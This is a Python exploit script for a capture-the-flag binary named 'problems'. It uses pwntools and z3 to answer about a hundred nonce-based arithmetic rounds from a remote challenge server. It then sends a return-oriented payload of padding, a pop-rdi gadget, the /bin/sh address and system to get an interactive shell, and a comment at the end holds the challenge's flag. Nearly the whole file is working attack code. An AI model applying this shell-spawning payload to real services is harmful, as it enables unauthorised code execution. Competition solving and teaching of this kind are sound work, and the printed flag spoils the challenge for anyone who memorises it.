from pwn import *
from z3 import * 

MAGIC = 0x539
MAX = 18446744073709551615
def problem(nonce1, nonce2, i):
    if i % 10 == 0:
        print("zero")
        # guess = guess + (nonce1 - nonce2) + i
        return MAGIC - (nonce1 - nonce2) - i
    elif i % 10== 0:
        print("zero")
        # guess = guess + ((nonce2 + nonce1) - i)
        return MAGIC - (nonce2 + nonce1) + i
    elif i % 10== 1:
        print("one")
        # guess = (i + nonce1 + nonce2) - guess
        return -1 * (MAGIC - (i + nonce1 + nonce2))
    elif i % 10== 2:
        print("two")
        # guess = guess + ((nonce1 - nonce2) - i)
        return MAGIC - ((nonce1 - nonce2) - i)
    elif i % 10== 3:
        print("three")
        # guess = (i + (nonce1 - nonce2)) - guess
        return -1 * (MAGIC - (i + (nonce1 - nonce2)))
    elif i % 10== 4:
        print("four")
        # guess = ((nonce2 + nonce1) - i) - guess
        return -1 * (MAGIC - ((nonce2 + nonce1) -i ))
    elif i % 10== 5:
        print("five")
        # guess = guess + nonce1 * nonce2 + i
        return MAGIC - nonce1 * nonce2 -i
    elif i % 10== 6:
        print("six")
        # guess = guess + nonce2 * i + nonce1
        return MAGIC - nonce2 * i - nonce1
    elif i % 10== 7:
        s = Solver()
        z3n1 = nonce1
        z3n2 = nonce2
        z3i = i
        retval = 1337
        z3guess = BitVec("z3guess", 32)
        z3nonce1 = BitVec(z3n1, 32)
        z3nonce2 = BitVec(z3n2, 32)
        z3ival = BitVec(z3i, 32)
        z3ret = BitVec(retval, 64)
        equation = [
            retval == z3n1 + z3n2 + z3guess * z3i
        ]

        s.add(equation)
        
        # def z3_solve(nonce1, nonce2):
        #     return nonce1 + nonce2 + 7 * guess

        # s.add(1337 == z3_solve(nonce1, nonce2))
        if s.check() == sat:
            print(s.model())
            ret = s.model()[z3guess].as_long()
            print("Nonce vals are: ", nonce1, nonce2, (nonce1 + nonce2 + 7 * ret % MAX))
            # assert ((nonce1 + nonce2 + 7 * ret) % MAX == 0x539)
            return ret
        else:
            exit("Failure")
    elif i % 10== 8:
        print("eight")
        s = Solver()
        z3n1 = nonce1
        z3n2 = nonce2
        z3i = i
        retval = 1337
        z3guess = BitVec("z3guess", 32)
        z3nonce1 = BitVec(z3n1, 32)
        z3nonce2 = BitVec(z3n2, 32)
        z3ival = BitVec(z3i, 32)
        z3ret = BitVec(retval, 64)
        equation = [
            # retval == z3n1 + z3n2 + z3guess * z3i
            retval == z3guess + z3n1 * z3n2 * z3i
        ]

        s.add(equation)
        if s.check() == sat:
            print(s.model())
            ret = s.model()[z3guess].as_long()
            print("Nonce vals are: ", nonce1, nonce2, (nonce1 + nonce2 + 7 * ret % MAX))
            # assert ((nonce1 + nonce2 + 7 * ret) % MAX == 0x539)
            return ret
        else:
            exit("Failure")
        # guess = guess + nonce1 * nonce2 * i
        # return MAGIC - nonce1 * nonce2 * i
    else:
        print("all else", i)
        # guess = guess + nonce1 + nonce2 + i
        return MAGIC - nonce1 - nonce2 - i

def ndecode(l):
    return int(l.decode().split(": ")[1].strip())


def main():
    LOCAL = False
    if LOCAL == True:
        context.terminal = ['tmux', 'splitw', '-h']
        elf = ELF('./problems')
        p = elf.process()
        rop = ROP('./problems')
    else:
        elf = ELF('./problems')
        p = remote('0.cloud.chals.io', 14011)


    for i in range(1, 100):
        print(f"Iteration: {i}")
        nonce1 = ndecode(p.recvline())
        print(f'Nonce 1 is: {nonce1}')
        nonce2 = ndecode(p.recvline())
        print(f'Nonce 2 is: {nonce2}')
        guess = problem(nonce1, nonce2, i)
        if i == 7:
            print("Guess at lucky 7: ", guess)
        l = p.recvuntil(">>> ")
        print(l)
        p.sendline(str(guess))
        l = p.recvline()
        print("Received line is: ", l)

    # l = p.recvuntil(">>> ")
    # l = p.recvline()
    print("Ready to send payload", l)
    # Need to leak libc address actually
    # p.sendline(b"A" * 96 + b"B" * 1000) # return address is 8 bytes
    pop_rdi = 0x000000000040169b
    # alignment = 0x00000000401016
    bin_sh = next(elf.search(b"/bin/sh")) # 4210808, 0x404078
    # bin_sh = 0x7ffff7e20860

    # system = next(elf.search(b"system")) # 4195733, 0x400595
    system = 0x401050
    # exit = next(elf.search(b"exit"))
    # system = 0x7ffff7f6f882
    # payload = b"B" * 16
    payload = b"B" * 16 + p64(pop_rdi, endian='little') + p64(bin_sh, endian='little') + p64(system, endian='little')

    print("Shell location: ", next(elf.search(b"/bin/sh")))
    print("System location: ", next(elf.search(b"system")))
    
    l = p.sendline(payload)
    print(l)
    # context.terminal = ['urxvtc', '-e', 'sh', '-c']
    
    p.interactive()

    # bin/sh address is 0x7ffff7f6f882
    # system address is 0x7ffff7e20860

    core = Coredump('./core')
    print("RIP:", hex(core.rip))
    print("RDI:", hex(core.rdi))
    print("RSP:", hex(core.rsp))

    # assert pack(core.rip) in core
    # print("Return pointer is: ", core.rip)

    

    # l = p.recvline()
    # print(l)
    # l = p.recvline()
    # print(l)
    # l = p.recvline()
    # print(l)
    # p.sendline("Hello")
        
    
if __name__ == '__main__':
    main()
    # uscg{br1ck_w4lls_g1v3_us_ch4nc3_2_sh0w_h0w_b4dly_w3_w4nt_s0m3th1ng}